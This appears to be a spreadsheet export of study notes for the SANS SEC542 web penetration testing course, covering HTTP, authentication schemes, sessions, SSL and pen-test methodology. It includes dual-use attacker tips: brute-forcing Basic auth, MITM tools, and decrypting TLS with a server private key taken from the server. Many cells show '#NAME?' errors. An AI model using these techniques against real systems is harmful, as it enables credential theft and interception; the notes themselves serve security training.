S542-1.2.06,SEC542,Origin Server,,,,,,#NAME?,1. Attacker's view,1.2 HTTP,B1P25,,,,,,sec542/1.2/index.htm#s6,,,,
S542-1.1.18,SEC542,Proxy Server architecture,,,,,,"- Sometimes called 'reverse proxy'.
- Subject To cache poisoning, information disclosure.",1. Attacker's view,1.1 Web Server Arch.,B1P18,,,,,,sec542/1.1/index.htm#s18,,,,
S542-1.1.17,SEC542,App Server architecture,,,App server fingerprint,,0,"- App Server provides a container for the app. 
- The app server itself provides feature sets for the attacker (PMI interface for performance mon., web console�). 
- WebSphere, WebLogic, JBoss, Cold Fusion, Lotus Domino. 
- Web server may also subject to source code disclosure, command injection.",1. Attacker's view,1.1 Web Server Arch.,B1P17,,,,,,sec542/1.1/index.htm#s17,550,,,
S542-1.1.19,SEC542,Attacker's perspective of web site server architecture,,,,,,"Attack vectors based on architure: cache poisoining, source code disclosure, command injection",1. Attacker's view,1.1 Web Server Arch.,B1P19,,,,,,sec542/1.1/index.htm#s19,,,,
S542-1.2.08,SEC542,Why Same Origin Policy?,,,,,,#NAME?,1. Attacker's view,1.2 HTTP,B1P27,,,,,,sec542/1.2/index.htm#s8,,,,
S542-1.2.11,SEC542,Query Parameter Formats,,,,,,"- The param=value is the std way for parms but it's not the only way.  
- Apache�s mod_rewrite used for search engine ranking (index.php/id/42/name/Kevin). 
- index.php/id=42$name=Kevin (override var on server-side, server-side parsing).",1. Attacker's view,1.2 HTTP,B1P30,,,,,,sec542/1.2/index.htm#s11,,,,
S542-1.2.12,SEC542,HTTP Request Methods,,,,,,#NAME?,1. Attacker's view,1.2 HTTP,B1P31,,,,,,sec542/1.2/index.htm#s12,,,,
S542-1.2.13,SEC542,GET/POST/HEAD Methods,,,,,,"- GET can be bookmarked, more easy to change (address bar). 
- POST used to protect the data. 
- HEAD only returns the header (to only get the HTTP status code). Speeds-up bruteforce attacks.",1. Attacker's view,1.2 HTTP,B1P32,,,,,,sec542/1.2/index.htm#s13,,,,
S542-1.2.09,SEC542,Enforcing the SOP,,,,,,"- Browser lets scripts send-out requests but will only allow it to access the content of the response if the response comes from the same protocol/host/port.
- If :80 is added, SOP is browser-specific (even browser versions).",1. Attacker's view,1.2 HTTP,B1P28,,,,,,sec542/1.2/index.htm#s9,,,,
S542-1.2.07,SEC542,Same origin policy,,,,,,#NAME?,1. Attacker's view,1.2 HTTP,B1P26,,,,,,sec542/1.2/index.htm#s7,,,,
S542-1.2.10,SEC542,Uniform Resource Indicators (URI),,,,,,"- protocol:// [user:password@] host.domainname [:port] /resource ?param=value. 
- IE still supports user:pwd@host within scripts (not the address bar).",1. Attacker's view,1.2 HTTP,B1P29,,,,,,sec542/1.2/index.htm#s10,,,,
S542-1.2.14,SEC542,TRACE/OPTIONS Methods,,,HTTP TRACE method is enabled,,1,"- OPTIONS to know which methods are supported by the web server 
  (sometimes the web server may not support all that are listed). 
- OPTIONS should not be enabled. 
- TRACE echoes request seen by server. Useful for infrastructure fingerprinting 
  (eg: find out if a reverse proxy is used). 
- Beware of false posives (OPTIONS shows TRACE enabled but not necessary the case). False findings from false positives (or other) in Pen Testing report may discredit the whole report.",1. Attacker's view,1.2 HTTP,B1P33,,,,,,sec542/1.2/index.htm#s14,933,,,
S542-1.2.15,SEC542,CONNECT Method,,,,,,#NAME?,1. Attacker's view,1.2 HTTP,B1P34,,,,,,sec542/1.2/index.htm#s15,,,,
S542-1.2.16,SEC542,PUT/DELETE Methods,,,,,,"- PUT to upload data, resource specified by the URL. 
- DELETE to remove a resource specified by the URL. 
- Could lead to DoS or possibly even authentication bypass (deleting .htaccess).",1. Attacker's view,1.2 HTTP,B1P35,,,,,,sec542/1.2/index.htm#s16,,,,
S542-1.2.17,SEC542,HTTP Response Codes,,,,,,"- 1xx Informal (not used a lot). 
- 2xx Success (200 OK) � not necessarily a success in your mind. 
  Server may use 200 simply because the server was able to serve some content 
  (maybe not what you expected)� 
- 3xx Redirection (302 Redirect, 304 Not Modified). 
  When XSS testing, flush cache to avoid 304 (false negative). 
- 4xx Client[-correctable] Error 
  401 Unauthz, 403 Forbidden, 404 File not found, 405 Method Not allowed, 408 Timeout 
- 5xx Server Error 
  500 server error, 502 Bad Gateway). 
  5xx codes are very useful during pen testing (SQL injection...)
  5xx to be marked down for later exploitation",1. Attacker's view,1.2 HTTP,B1P36,,,,,,sec542/1.2/index.htm#s17,,,,
S542-1.2.18,SEC542,Attacker's perspective of HTTP,,,,,,"- Look for methods that shouldn't be supported (PUT, DELETE, CONNECT). 
- TRACE is good for mapping architecture. 
- Try method interchange (GET <-> POST).
- XSS are easier with GET method (than POST). ",1. Attacker's view,1.2 HTTP,B1P37,,,,,,sec542/1.2/index.htm#s18,,,,
S542-1.2.19,SEC542,HTTP Exercise,,,,,,,1. Attacker's view,1.2 HTTP,B1P38,,,,,,sec542/1.2/index.htm#s19,,,,
S542-1.2.20,SEC542,HTTP Exercise: Goals,,,,,,Goals: Analyse the HTTP Protocol,1. Attacker's view,1.2 HTTP,B1P39,,,,,,sec542/1.2/index.htm#s20,,,,
S542-1.2.21,SEC542,HTTP Exercise: Protocol Analysis,,,,,,Start Wireshark,1. Attacker's view,1.2 HTTP,B1P40,,,,,,sec542/1.2/index.htm#s21,,,,
S542-1.2.22,SEC542,HTTP Exercise: Analyzing Send Req,,,,,,Firefox go to Bookmark �Exercise #1�.,1. Attacker's view,1.2 HTTP,B1P41,,,,,,sec542/1.2/index.htm#s22,,,,
S542-1.2.23,SEC542,HTTP Exercise: Analyzing HTTP Crafted Req,,,,,,"- Run netcat
  nc www.sec542.org 80. Type request: 
  POST /form_auth/login.php HTTP/1.0. 
  Content-Length: 30. 

  User=Ed&pass=test&button=Login. 
- Stop capture",1. Attacker's view,1.2 HTTP,B1P42,,,,,,sec542/1.2/index.htm#s23,,,,
S542-1.2.24,SEC542,HTTP Exercise: Questions,,,,,,"Q1: What do the 1st two frames represent? The next three? 
       DNS or ARP Req./Resp. TCP hanshake
Q2: In which frame do we first see HTTP protocol? 6th
Q3: In which frames HTTP requests? Responses?
       Requests:6/10/19/33. Responses: 8/17/20/41. 
      GET for HTML + Get for /sans.gif + GET for favicon.ico + POST
Q4: Status for the responses? 200 OK (even for POST response)
Q5: What  User-Agent string associated  with Firefox? In what 2 frames?
       Mozilla/5.0 (...), Gecko/... Frames 6 & 10
Q6: What other information is present  in HTTP request (besides User-Agent)?
       Host, Accept (text/html, application/xhtml+xml...), Accept-Language: en-us, 
       Accept-Encoding: gzip,deflate
       Accept-Charset: ISO-8859-1..., Keep-Alive: 300, Connect: keep-alive",1. Attacker's view,1.2 HTTP,B1P43,,,,,,sec542/1.2/index.htm#s24,,,,
S542-1.3.01,SEC542,Client Authentication: Section Objectives,,,,,,"Identify and discuss the strengths and weakesses of the major types of client authentication, the types of client authentication methods in use today, what basic authentication is and what its weaknesses are, what digest authentication was designed for and what its limitations are, what certificate-based authentication is and what its advantages are, what Integrated Windows authentication is and how it works, what forms based authentication is and how it works, and, given traffic, identify the type of authentication in use.",1. Attacker's view,1.3 Client Auth.,B1P46,,,,,,sec542/1.3/index.htm#s1,,,,
S542-1.2.25,SEC542,HTTP Exercise: Answers,,,,,,"Review answers
Q6: Types of data the client supports (file types, lang., encodings, character sets)",1. Attacker's view,1.2 HTTP,B1P44,,,,,,sec542/1.2/index.htm#s25,,,,
S542-1.3.02,SEC542,Client Authentication,,,,,,"5 main schemes: Basic, Digest, Client Cert., IWA, Forms-based",1. Attacker's view,1.3 Client Auth.,B1P47,,,,,,sec542/1.3/index.htm#s2,,,,
S542-1.3.03,SEC542,Basic Auth.,,,Basic Authentication (and no TLS),,2,#NAME?,1. Attacker's view,1.3 Client Auth.,B1P48,,,,,,sec542/1.3/index.htm#s3,287,,,
S542-1.3.04,SEC542,Basic Auth. Illustrated,,,,,,"1. Client Request
2. Server sends: 
   HTTP/1.1 401 Authorization Required
   WWW-Authenticate: Basic realm=sans.org
3. Client sends: 
    Get http://... HTTP/1.1
    Authorization: Basic STRING    (USERNAME:PWD in BASE64)",1. Attacker's view,1.3 Client Auth.,B1P49,,,,,,sec542/1.3/index.htm#s4,,,,
S542-1.3.08,SEC542,Digest Auth.: Attacker's Perspective,,,,,,#NAME?,1. Attacker's view,1.3 Client Auth.,B1P53,,,,,,sec542/1.3/index.htm#s8,,,,
S542-1.3.09,SEC542,Client Cert. Authentication,,,,,,"- Certs in clients and servers. Authentication of client and server (SSL requires server auth.)
- Problems: certificate mgmt (how to send to clients), only authenticating the client system (not the user) if passphrase isn�t used, 
- AD is interesting: client cert as part of AD user account, installed at user logon ",1. Attacker's view,1.3 Client Auth.,B1P54,,,,,,sec542/1.3/index.htm#s9,,,,
S542-1.3.05,SEC542,Basic Auth: Attacker's Perspective,,,,,,"- Bruteforceable with HEAD method (no account lockout, max. login attempts)
- Easily sniffed base-64 encoded passwords (in clear text)
- Easily replayed.
- Website spoofing/impersonation can dupe browsers into providing credentials.
- No logout functionality (only closing of the browser)",1. Attacker's view,1.3 Client Auth.,B1P50,,,,,,sec542/1.3/index.htm#s5,,,,
S542-1.3.06,SEC542,Digest Auth.,,,,,,"- To �fix� Basic Auth.
- MD5 hash of username:realm:password to send password hashes
- Uses nonce obtained from the server (sent in clear text)
- SHA1 can also be used.
- RFC2069 replaced by 2617. 
- In RFC2617: Quality of protection (qop) flag (different methods for hashing).  Client Nonce (cnonce).
- A nonce is the same as a salt.
- A cnonce can be sent to server to authenticate it (not used often, if at all)
",1. Attacker's view,1.3 Client Auth.,B1P51,,,,,,sec542/1.3/index.htm#s6,,,,
S542-1.3.07,SEC542,Digest Auth. Illustrated,,,,,,"1. Initial client request. 
2. Server sends 401 with nonce. 
3. Client sends request with Nonce received. Response contains MD5 hash generated by the algo specified in qop (eg: auth)",1. Attacker's view,1.3 Client Auth.,B1P52,,,,,,sec542/1.3/index.htm#s7,,,,
S542-1.3.10,SEC542,Client Cert. Auth. Illustrated,,,,,,"1. Client requests a protected resource
2. Server presents cert.
3. Client verifies cert.
4. Client presents its cert.
5. Server verifies cert.
6. Access to resources allowed (bi-dir. exchange)",1. Attacker's view,1.3 Client Auth.,B1P55,,,,,,sec542/1.3/index.htm#s10,,,,
S542-1.3.14,SEC542,IWA: Attacker's Perspective,,,,,,"- Focus on client machines that are always logged on. 
- Perfect for CSRF (user always logged-in)
- XSS can also help here to automate the CSRF attack (not cookie stealing).",1. Attacker's view,1.3 Client Auth.,B1P59,,,,,,sec542/1.3/index.htm#s14,,,,
S542-1.3.11,SEC542,Client Cert. Auth.: Attacker's Perspective,,,,,,"Focus on client: 
- Stealing private key 
- Using authenticated sessions to attack web apps",1. Attacker's view,1.3 Client Auth.,B1P56,,,,,,sec542/1.3/index.htm#s11,,,,
S542-1.3.12,SEC542,Integrated Windows Authentication (IWA),,,,,,#NAME?,1. Attacker's view,1.3 Client Auth.,B1P57,,,,,,sec542/1.3/index.htm#s12,,,,
S542-1.3.13,SEC542,IWA Illustrated,,,,,,"2. Server sends challenge in 401 response with WWW-Authenticate header to NTLM (or other)
3. Client computes response from Lanman hash (used as DES key) & challenge and sends it...",1. Attacker's view,1.3 Client Auth.,B1P58,,,,,,sec542/1.3/index.htm#s13,,,,
S542-1.3.15,SEC542,Forms-Based Authentication,,,,,,#NAME?,1. Attacker's view,1.3 Client Auth.,B1P60,,,,,,sec542/1.3/index.htm#s15,,,,
S542-1.3.17,SEC542,Forms-Based Authentication Illustrated,,,,,,,1. Attacker's view,1.3 Client Auth.,B1P62,,,,,,sec542/1.3/index.htm#s17,,,,
S542-1.3.16,SEC542,Forms-Based Authentication Pieces,,,,,,Made of: HTML form + processing code + resources that required auth.,1. Attacker's view,1.3 Client Auth.,B1P61,,,,,,sec542/1.3/index.htm#s16,,,,
S542-1.3.18,SEC542,Forms-Based Authentication: Attacker's Perspective,,,,,,#NAME?,1. Attacker's view,1.3 Client Auth.,B1P63,,,,,,sec542/1.3/index.htm#s18,,,,
S542-1.3.19,SEC542,,,,,,,,1. Attacker's view,1.3 Client Auth.,,,,,,,sec542/1.3/index.htm#s19,,,,
S542-1.3.20,SEC542,Auth. Exercise: Goals,,,,,,Goal: Examine various authentication types,1. Attacker's view,1.3 Client Auth.,B1P65,,,,,,sec542/1.3/index.htm#s20,,,,
S542-1.3.21,SEC542,Auth. Exercise: Launch Paros,,,,,,"cd /usr/bin/samurai/paros
java [-Xmx512m]  -jar paros.jar",1. Attacker's view,1.3 Client Auth.,B1P66,,,,,,sec542/1.3/index.htm#s21,,,,
S542-1.3.22,SEC542,Auth. Exercise: Config. Firefox for Paros,,,,,,Set SwitchProxy (firefox add-on) to Paros,1. Attacker's view,1.3 Client Auth.,B1P67,,,,,,sec542/1.3/index.htm#s22,,,,
S542-1.3.23,SEC542,Auth. Exercise: Paros - Basic Auth,,,,,,"- Exercise #2 - Basic Authentication (Bookmarks in Samurai VM)
- Client: GET http://www.sec542.org/basic/exercise2_basic.html HTTP/1.1
- Server: HTTP/1.0 401 Authorization Required
               (other headers) Date, Server: Apache/2.2.9...
               WWW-Authenticate: Basic realm=""Basic Auth Restricted""
               (other headers) Vary, Content-Length, Content-Type
- Client: Authorization: Basic <BASE64>
- Server: HTTP/1.0 401 Authorization Required  (with bad password)
- Server: HTTP/1.0 200 OK  (with good password testuser/foobar)",1. Attacker's view,1.3 Client Auth.,B1P68,,,,,,sec542/1.3/index.htm#s23,,,,
S542-1.3.25,SEC542,Auth. Exercise: Paros - Digest Auth.,,,,,,"Server: ?
   HTTP/1.1 401 Authorization Required...
  WWW-Authenticate: Digest realm=""Digest Auth Restricted"",  nonce=""7pi/31mdBAA=f46a2ae23bc3820eebc89..."", algorithm=MD5, qop=""auth""
Client:
?  GET http://www.sec542.org/digest/exercise2_digest.html HTTP/1.1
  Host: www.sec542.org
  User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.15) Gecko...
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-us,en;q=0.5
  Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
  Keep-Alive: 300
  Proxy-Connection: keep-alive
  Authorization: Digest username=""testuser"", realm=""Digest Auth Restricted"", nonce=""7pi/31mdBAA=f46a2ae23bc3820eebc89dbdb8adafdec6dfc9c5"", uri=""/digest/exercise2_digest.html"", algorithm=MD5, response=""0b2c4176c1adb1e33a12b22de2b7b6eb"", qop=auth, nc=00000001, cnonce=""56053882c1a82bd6""

Q4: Where's the password in Paros? Nowhere. Hashed nonce values are used instead:
Q5: Why is Digest Auth. More secure than Basic Auth? Password is never sent (one-way hash)
Q6: Is the page data encrypted? No",1. Attacker's view,1.3 Client Auth.,B1P70,,,,,,sec542/1.3/index.htm#s25,,,,
S542-1.3.27,SEC542,,,,,,,,1. Attacker's view,1.3 Client Auth.,,,,,,,sec542/1.3/index.htm#s27,,,,
S542-1.3.28,SEC542,,,,,,,,1. Attacker's view,1.3 Client Auth.,,,,,,,sec542/1.3/index.htm#s28,,,,
S542-1.4.01,SEC542,Session Tracking & SSL,,,,,,"Discuss how session tracking is used and how SSL/TLS is used in modern web communications, as well as what session tracking is used for any why its needed, the major types of session tracking and the pros and cons of each, the key differences between client and server-side session tracking, how SSL/TLS is used in modern web communications, and the advantages and limitations of SSL/TLS.",1. Attacker's view,1.4 Sess. Tracking,B1P74,,,,,,sec542/1.4/index.htm#s1,,,,
S542-1.4.02,SEC542,Stateless as a Way of Life,,,,,,#NAME?,1. Attacker's view,1.4 Sess. Tracking,B1P75,,,,,,sec542/1.4/index.htm#s2,,,,
S542-1.4.03,SEC542,Session Tracking,,,,,,The client is trusted to send the data back unchanged,1. Attacker's view,1.4 Sess. Tracking,B1P76,,,,,,sec542/1.4/index.htm#s3,,,,
S542-1.4.04,SEC542,Types of Sessions: Client-side vs Server-Side,,,,,,#NAME?,1. Attacker's view,1.4 Sess. Tracking,B1P77,,,,,,sec542/1.4/index.htm#s4,,,,
S542-1.3.26,SEC542,Auth. Exercise: Paros - Form Auth.,,,,,,"Q7: Is the information encrypted/obfuscated? No
      POST data: user=testuser&pass=opensesame&button=Login
Q8: What must be used with forms auth to protect data from server? HTTPS (or pwd hashing)",1. Attacker's view,1.3 Client Auth.,B1P71,,,,,,sec542/1.3/index.htm#s26,,,,
S542-1.3.24,SEC542,Auth. Exercise: Paros - Basic Auth,,,,,,"Q1: Cleartext? No but close
-Use Paros Tools->Encoder/Hash, Use Base64 Decode G65 to decode BASE64
- BASE64 decodes to USERNAME:PASSWORD (cleartext)
Q2: Is BASE64 encoding sufficient? No
Q3: Is page data encrypted/obfuscated? No",1. Attacker's view,1.3 Client Auth.,B1P69,,,,,,sec542/1.3/index.htm#s24,,,,
S542-1.4.05,SEC542,Cookies,,,,,,"- Browser supposed to store then w/o alteration, blindly passing them back to server. 
- Can be marked as Secure (only sent via HTTPS).
- Can also be marked with HttpOnly to that scripts don't get access them (good against XSS protection, if AJAX isn't used...). 
- For modification, it's better to intercept the Set-Cookie from server as opposed to intercepting and modifying them on their way back to the server.",1. Attacker's view,1.4 Sess. Tracking,B1P78,,,,,,sec542/1.4/index.htm#s5,,,,
S542-1.4.06,SEC542,URL Encoding,,,,,,"- Data in URL (?sessionid=12345). 
- Leaked in links, on proxy, header field Refer...",1. Attacker's view,1.4 Sess. Tracking,B1P79,,,,,,sec542/1.4/index.htm#s6,,,,
S542-1.4.07,SEC542,Hidden Form Fields,,,,,,"- Paypal mistake (price in hidden form)
- <input type=""hidden"" name=""username"" value=""c_smith"">
- Modifiable via interception proxies or browser plugins. eg Web Developer add-on (or Firebug)",1. Attacker's view,1.4 Sess. Tracking,B1P80,,,,,,sec542/1.4/index.htm#s7,,,,
S542-1.4.08,SEC542,Attacker's perspective of Session State,,,,,,#NAME?,1. Attacker's view,1.4 Sess. Tracking,B1P81,,,,,,sec542/1.4/index.htm#s8,,,,
S542-1.4.09,SEC542,,,,,,,,1. Attacker's view,1.4 Sess. Tracking,,,,,,,sec542/1.4/index.htm#s9,,,,
S542-1.4.10,SEC542,Encrypting HTTP in Transit,,,,,,"- Lies below app layer so it's usable by different apps such as IMAPS, LDAPS, HTTPS... 
- OpenVPN uses SSL (easier implem. than IPSEC)
- SSLv2 far less secure thatn SSLv3 and TLSv1
- SSL/TLS relies on trust placed with CA
- TLS uses both MD5 and SHA1 for hashing to lower hash collision probability
- US Gov. requires TLSv1
- Your browser trusts CAs for you...",1. Attacker's view,1.4 Sess. Tracking,B1P83,,,,,,sec542/1.4/index.htm#s10,,,,
S542-1.4.11,SEC542,SSL,,,,,,"- With SSL, we're authenticating the server to the client via a web-of-trust (PKI) 
- CA verif weakened over time: simple email from domain...
- Now, we have Extended Validation SSL Certs (EV-SSL). CAs charge more for validation they used to do!
- Browsers show green bar for EV Certificates
- To circumvent the web-of-trust:
  - Self-signing with compromized CA private key
  - Impersonate another company and request a cert
  - Misconfigure an SSL client to prevent alert window from appearing
  - Letting the end-user disregard browser warnings",1. Attacker's view,1.4 Sess. Tracking,B1P84,,,,,,sec542/1.4/index.htm#s11,,,,
S542-1.4.13,SEC542,SSL Attacker's Perspective,,,,,,"- Decrypt SSL using key stolen from server
- Attacker can use SSL to hide from IDS
- Alter browser content prior to entering the tunnel
- MITM tools: Middler, SSLStrip
- Get data on either end. Eg: DLL injection (so-injection on POSIX)
- IDS via installed web server private cert or SSL Accelerator",1. Attacker's view,1.4 Sess. Tracking,B1P87,,,,,,sec542/1.4/index.htm#s13,,,,
S542-1.4.16,SEC542,SSL Encr. Exercise: Launch Firefox,,,,,,- Firefox bookmark: Exercise #3 - SSL Encryption,1. Attacker's view,1.4 Sess. Tracking,B1P90,,,,,,sec542/1.4/index.htm#s16,,,,
S542-1.4.14,SEC542,,,,,,,,1. Attacker's view,1.4 Sess. Tracking,,,,,,,sec542/1.4/index.htm#s14,,,,
S542-1.4.15,SEC542,SSL Encr. Exercise: Launch Wireshark,,,,,,#NAME?,1. Attacker's view,1.4 Sess. Tracking,B1P89,,,,,,sec542/1.4/index.htm#s15,,,,
S542-1.4.17,SEC542,SSL Encr. Exercise: Examine Packets,,,,,,"Q1: What frame has 1st packet to carry data that makes up the web page? Frame 12
Q2: Based on capture, what can be inferred?
      Not much except: HTTP over TLS1.0, Cipher: TLS_RSA_WITH_RC4_128_MD5",1. Attacker's view,1.4 Sess. Tracking,B1P91,,,,,,sec542/1.4/index.htm#s17,,,,
S542-1.4.18,SEC542,SSL Encr. Exercise: Find Hidden Message,,,,,,"- Use Wireshark with the server key. Server keys can often be recovered from the server root.
- Add to Wireshark (Edit->Prefs->Protocols->SSL->RSA keys list):
   www.sec542.org,443,http,/etc/apache2/ssl.key/server.pem
- What's the secret message? Drink more Ovaltine (inline comment)",1. Attacker's view,1.4 Sess. Tracking,B1P92,,,,,,sec542/1.4/index.htm#s18,,,,
S542-1.4.19,SEC542,SSL Encr. Exercise Answers,,,,,,,1. Attacker's view,1.4 Sess. Tracking,B1P93,,,,,,sec542/1.4/index.htm#s19,,,,
S542-1.4.12,SEC542,Certificate Trusts,,,Invalid SSL certificate,,2,"1. Trust establishment between Server and CA
    - Server owner sends cert request with public key of server to CA 
    - CA performs some type of validation 
    - CA generates a signed certificate (w/ priv key) using info from server-owner  
  2. Trust establishment between Client and Server through CA:
    - Client connects to server with HTTPS. 
    - The server sends back the certificate signed by CA (with server's public key)
    - Because we trust the CA (trusted CA cert in browser), we trust the certificate.
- Internally, you can self-sign certificates and add your own CA cert to browsers you control",1. Attacker's view,1.4 Sess. Tracking,B1P86,"SSL (or TLS) helps to protect the confidentiality and integrity of information in transit between the browser and server, and to provide authentication of the server's identity. To serve this purpose, the server must present an SSL certificate that is valid for the server's hostname, is issued by a trusted authority and is valid for the current date. If any one of these requirements is not met, SSL connections to the server will not provide the full protection for which SSL is designed.
It should be noted that various attacks exist against SSL in general, and in the context of HTTPS web connections in particular. It may be possible for a determined and suitably-positioned attacker to compromise SSL connections without user detection even when a valid SSL certificate is used.",Certificates should be carefully managed and checked to assure that data are encrypted with the intended owner's public key.,true,https://wiki.mozilla.org/Security/Server_Side_TLS,,sec542/1.4/index.htm#s12,295,,,
S542-1.4.21,SEC542,Black Box Pen Testing,,,,,,#NAME?,1. Attacker's view,1.4 Sess. Tracking,B1P95,,,,,,sec542/1.4/index.htm#s21,,,,
S542-1.4.24,SEC542,Testing Methods: Manual vs Automated,,,,,,,1. Attacker's view,1.4 Sess. Tracking,B1P98,,,,,,sec542/1.4/index.htm#s24,,,,
S542-1.4.25,SEC542,Manual Web App Pen Testing,,,,,,"- As thorough as you want it to be
- Slower 
- Depends on tester's time, attention and skill set",1. Attacker's view,1.4 Sess. Tracking,B1P99,,,,,,sec542/1.4/index.htm#s25,,,,
S542-1.4.20,SEC542,,,,,,,,1. Attacker's view,1.4 Sess. Tracking,,,,,,,sec542/1.4/index.htm#s20,,,,
S542-1.4.22,SEC542,Crystal Box Pen Testing,,,,,,#NAME?,1. Attacker's view,1.4 Sess. Tracking,B1P96,,,,,,sec542/1.4/index.htm#s22,,,,
S542-1.4.23,SEC542,Grey Box Pen Testing,,,,,,#NAME?,1. Attacker's view,1.4 Sess. Tracking,B1P97,,,,,,sec542/1.4/index.htm#s23,,,,
S542-1.4.26,SEC542,Automated Web App Pen Testing,,,,,,"- Some commercial: HP WebInspect, Cenzic Hailstorm, IBM AppScan, Burp
- Some open source: Paros, Burp...
- More prone to false-positives and less business-oriented
- Their power depends on their configuration",1. Attacker's view,1.4 Sess. Tracking,B1P100,,,,,,sec542/1.4/index.htm#s26,,,,
S542-1.5.03,SEC542,Managing a WAPT,,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P104,,,,,,sec542/1.5/index.htm#s3,,,,
S542-1.5.04,SEC542,Establishing the Test Scope,,,,,,"- What are we allowed to test
- What's the purpose/scope/focus of the test
- What's to be avoided
- What types of tests, what apps�?",1. Attacker's view,1.5 Methodology,B1P105,,,,,,sec542/1.5/index.htm#s4,,,,
S542-1.5.05,SEC542,Gathering Information Required for the Test,,,,,,"Prior to starting:
- Get the apps in scope, usernames with passwords
- Get 2 users for each types of users / admins (2x2 accounts up front)
- Technology restrictions (IE only, servers/ports to avoid)
- Contacts (emergency, both ways)",1. Attacker's view,1.5 Methodology,B1P106,,,,,,sec542/1.5/index.htm#s5,,,,
S542-1.5.06,SEC542,Rules of Engagement,,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P107,,,,,,sec542/1.5/index.htm#s6,,,,
S542-1.5.07,SEC542,Identifying Tester Traffic and Data in the Application,,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P108,,,,,,sec542/1.5/index.htm#s7,,,,
S542-1.5.08,SEC542,Testing Time Windows,,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P109,,,,,,sec542/1.5/index.htm#s8,,,,
S542-1.4.27,SEC542,Hybrid Web App Pen Testing,,,,,,#NAME?,1. Attacker's view,1.4 Sess. Tracking,B1P101,,,,,,sec542/1.4/index.htm#s27,,,,
S542-1.5.10,SEC542,,,,,,,,1. Attacker's view,1.5 Methodology,,,,,,,sec542/1.5/index.htm#s10,,,,
S542-1.5.02,SEC542,WAPT Preparation,,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P103,,,,,,sec542/1.5/index.htm#s2,,,,
S542-1.5.09,SEC542,Communications Planning,,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P110,,,,,,sec542/1.5/index.htm#s9,,,,
S542-1.5.11,SEC542,Reporting,,,,,,"- What the client will have/keep for a while
- The most important, the ""product""
- Build a system: as you test, the report pieces are being pulling together",1. Attacker's view,1.5 Methodology,B1P112,,,,,,sec542/1.5/index.htm#s11,,,,
S542-1.5.01,SEC542,Methodology & Reporting: Section Objectives,,,,,,"Identify the typical methods and components of a web application penetration test as well as the various methods used for a pen test and the pros and cons of each, the pros and cons of hybrid, automated, and manual pen tests, the steps that should be taken before engaging in a pen test, the importance of scopes, rules of engagement, and permission, why communications is critical throughout the pen test, the importance of a complete and accurate report, the various parts of a pen test report and how data collection tools can be used, the importance of presentations and how to handle one, the general pen test methodology and why its important to follow it, why thorough reconnaissance is important and the typical recon steps, why network mapping is important and what it can tell an attacker, and the typical categories of flaws found during a test.",1. Attacker's view,1.5 Methodology,B1P102,,,,,,sec542/1.5/index.htm#s1,,,,
S542-1.5.13,SEC542,1. Executive Summary,,,,,,"- 1 page (1.5 max.)
- Contains
  - Findings:  Critical  findings, Root cause of findings, Required changes (to dev process)  
  - Recommendations: Reasonable goals, overarching solutions, recommended timeframes",1. Attacker's view,1.5 Methodology,B1P114,,,,,,sec542/1.5/index.htm#s13,,,,
S542-1.5.16,SEC542,4. Findings,,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P117,,,,,,sec542/1.5/index.htm#s16,,,,
S542-1.5.12,SEC542,Report Pieces,,,,,,"- Every parts of the testing becomes a portion of the report
- 5 sections: Exec Summary, Intro, Methodology, Findings, Conclusion [, Appendix)",1. Attacker's view,1.5 Methodology,B1P113,,,,,,sec542/1.5/index.htm#s12,,,,
S542-1.5.14,SEC542,2. Introduction,,,,,,"Outline parts of the test:
- Explain scope
- Define objective of test
- List the team with contact information (within the company)
- 1 to 2 pages",1. Attacker's view,1.5 Methodology,B1P115,,,,,,sec542/1.5/index.htm#s14,,,,
S542-1.5.15,SEC542,3. Methodology,,,,,,"- Describe the methodology during the test, customized for the project
- Step-by-step, including the tools used at each step
- Customize the tests and findings (no boilerplate)
- Enough depth so that a  competent Pen Tester can verify and repeat 
- 3 to 10 pages",1. Attacker's view,1.5 Methodology,B1P116,,,,,,sec542/1.5/index.htm#s15,,,,
S542-1.5.17,SEC542,5. Conclusion,,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P118,,,,,,sec542/1.5/index.htm#s17,,,,
S542-1.5.18,SEC542,Reporting Tools,,,,,," '- 2 types: 
- Data  Collection: Wiki (MediaWiki, MoinMoin), CAL9000 from OWASP, Mind Mapping (FreeMind/MindMapper)
- Report Generation: Word Processor, OWASP Report Generator",1. Attacker's view,1.5 Methodology,B1P119,,,,,,sec542/1.5/index.htm#s18,,,,
S542-1.5.19,SEC542,Data Collection Tools,,,,,,"- CAL9000 from OWASP (in HTML & Javascript, runs locally)
- Mind Mapping: Freemind (color coded for each part of methodology
- Centralized to multiple testers",1. Attacker's view,1.5 Methodology,B1P120,,,,,,sec542/1.5/index.htm#s19,,,,
S542-1.5.20,SEC542,Preparing Data Collection Tools,,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P121,,,,,,sec542/1.5/index.htm#s20,,,,
S542-1.5.21,SEC542,Using Data Collection Tools,,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P122,,,,,,sec542/1.5/index.htm#s21,,,,
S542-1.5.26,SEC542,Recon (1/4),,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P127,,,,,,sec542/1.5/index.htm#s26,,,,
S542-1.5.27,SEC542,Typical Recon Steps,,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P128,,,,,,sec542/1.5/index.htm#s27,,,,
S542-1.5.28,SEC542,Mapping (2/4),,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P129,,,,,,sec542/1.5/index.htm#s28,,,,
S542-1.5.22,SEC542,Report Generation Tools,,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P123,,,,,,sec542/1.5/index.htm#s22,,,,
S542-1.5.29,SEC542,Typical Mapping Steps,,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P130,,,,,,sec542/1.5/index.htm#s29,,,,
